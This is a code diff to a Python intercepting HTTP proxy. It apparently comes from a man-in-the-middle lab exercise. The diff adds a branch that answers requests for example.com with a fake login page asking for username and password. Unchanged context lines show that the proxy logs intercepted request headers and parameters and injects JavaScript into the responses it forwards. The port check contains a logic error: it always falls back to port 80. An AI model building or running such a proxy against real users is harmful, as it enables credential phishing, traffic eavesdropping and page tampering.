@@ -80,69 +80,146 @@ def inject_javascript(response, proxy_ip):
     return modified_response
 
 
-def handle_client(client_socket, mode, proxy_ip, port):
+def handle_client(client_socket, mode, proxy_ip):
     # Receive client request
     request = client_socket.recv(4096).decode('utf-8', errors='ignore')
     print("Received request:", request)  # Add this for debugging
     
-    # Extract destination from Host header in the request
-    host_match = re.search(r"Host: (.+)\r\n", request)
-    if host_match:
-        destination_host = host_match.group(1).strip()
-    else:
-        client_socket.close()
-        return  # Exit if there's no valid Host header
-
-    # Resolve the destination IP and set port 80 as default for HTTP
-    try:
-        if ":" not in destination_host:
-            destination_ip = socket.gethostbyname(destination_host)
-            destination_port = 80
+    if request.startswith("GET") or request.startswith("POST"):
+        host_match = re.search(r"Host: (.+)\r\n", request)
+        if host_match:
+            destination_host = host_match.group(1).strip()
         else:
-            destination_host_split = destination_host.split(sep=':')
-            destination_ip = destination_host_split[0]
-            print(destination_host_split[1])
-            if destination_host_split[1] != "8080" or destination_host_split[1] != "80":
+            client_socket.close()
+            return  # Exit if there's no valid Host header
+
+        # Resolve the destination IP and set port 80 as default for HTTP
+        try:
+            if ":" not in destination_host:
+                destination_ip = socket.gethostbyname(destination_host)
                 destination_port = 80
             else:
-                destination_port = destination_host_split[1]
-            
+                destination_host_split = destination_host.split(sep=':')
+                destination_ip = destination_host_split[0]
+                print(destination_host_split[1])
+                if destination_host_split[1] != "8080" or destination_host_split[1] != "80":
+                    destination_port = 80
+                else:
+                    destination_port = destination_host_split[1]
+                
 
-    except socket.gaierror:
-        client_socket.close()
-        return
-    
-    if mode == "passive":
-        # Log request data (includes headers and URL query parameters)
-        log_passive_info(request)
-    elif mode == "active" and destination_ip == proxy_ip:
-        print("Detected request for proxy itself; logging active information.")
-        log_active_info(request)
+        except socket.gaierror:
+            client_socket.close()
+            return
+        
+        # Phishing Attack for specific domain (e.g., example.com)
+        if destination_host == "example.com":
+            phishing_page = """HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
+            <html>
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Login Page</title>
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        background-color: #f2f2f2;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        margin: 0;
+                    }
+                    .login-container {
+                        background-color: #ffffff;
+                        padding: 20px 30px;
+                        border-radius: 8px;
+                        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+                        text-align: center;
+                    }
+                    .login-container h2 {
+                        margin-bottom: 15px;
+                    }
+                    .login-container input {
+                        width: 100%;
+                        padding: 10px;
+                        margin: 8px 0;
+                        border: 1px solid #ddd;
+                        border-radius: 4px;
+                        box-sizing: border-box;
+                    }
+                    .login-container button {
+                        width: 100%;
+                        padding: 10px;
+                        background-color: #4CAF50;
+                        border: none;
+                        color: white;
+                        border-radius: 4px;
+                        cursor: pointer;
+                    }
+                    .login-container button:hover {
+                        background-color: #45a049;
+                    }
+                    .login-container a {
+                        display: block;
+                        margin-top: 10px;
+                        color: #4CAF50;
+                        text-decoration: none;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="login-container">
+                    <h2>Login</h2>
+                    <form method="POST" action="/login">
+                        <input type="text" placeholder="Username" name="username" required>
+                        <input type="password" placeholder="Password" name="password" required>
+                        <button type="submit">Login</button>
+                    </form>
+                </div>
+            </body>
+            </html>
 
-    # Forward request to the actual destination
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        server_socket.connect((destination_ip, destination_port))
-        server_socket.send(request.encode('utf-8'))
+            """
 
-        # Receive and forward response in chunks to handle large responses
-        while True:
-            response = server_socket.recv(4096)
-            if len(response) == 0:
-                break  # Exit loop when no more data is received
+            log_passive_info(f"Phishing page served for {destination_host}. Request details: {request}")
+            client_socket.send(phishing_page.encode('utf-8'))
+            client_socket.close()
+            return
+        
+        if mode == "passive":
+            # Log request data (includes headers and URL query parameters)
+            log_passive_info(request)
+        elif mode == "active" and destination_ip == proxy_ip:
+            print("Detected request for proxy itself; logging active information.")
+            log_active_info(request)
 
-            if mode == "active":
-                response_decoded = response.decode('utf-8', errors='ignore')
-                response_with_js = inject_javascript(response_decoded, proxy_ip)
-                client_socket.send(response_with_js.encode('utf-8'))
-            else:
-                # Send the response back to the client exactly as received
-                client_socket.send(response)
-    except ConnectionRefusedError:
-        print(f"Connection to {destination_host} ({destination_ip}) refused.")
-    finally:
-        client_socket.close()
-        server_socket.close()
+        # Forward request to the actual destination
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            server_socket.connect((destination_ip, destination_port))
+            server_socket.send(request.encode('utf-8'))
+
+            # Receive and forward response in chunks to handle large responses
+            while True:
+                response = server_socket.recv(4096)
+                if len(response) == 0:
+                    break  # Exit loop when no more data is received
+
+                if mode == "active":
+                    response_decoded = response.decode('utf-8', errors='ignore')
+                    response_with_js = inject_javascript(response_decoded, proxy_ip)
+                    client_socket.send(response_with_js.encode('utf-8'))
+                else:
+                    # Send the response back to the client exactly as received
+                    client_socket.send(response)
+        except ConnectionRefusedError:
+            print(f"Connection to {destination_host} ({destination_ip}) refused.")
+        finally:
+            client_socket.close()
+            server_socket.close()
+    else:
+        print("nope")
 
 
 def start_proxy(ip, port, mode):
@@ -154,7 +231,7 @@ def start_proxy(ip, port, mode):
 
     while True:
         client_socket, addr = proxy_socket.accept()
-        handle_client(client_socket, mode, ip, port)
+        handle_client(client_socket, mode, ip)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Transparent Proxy for Logging")
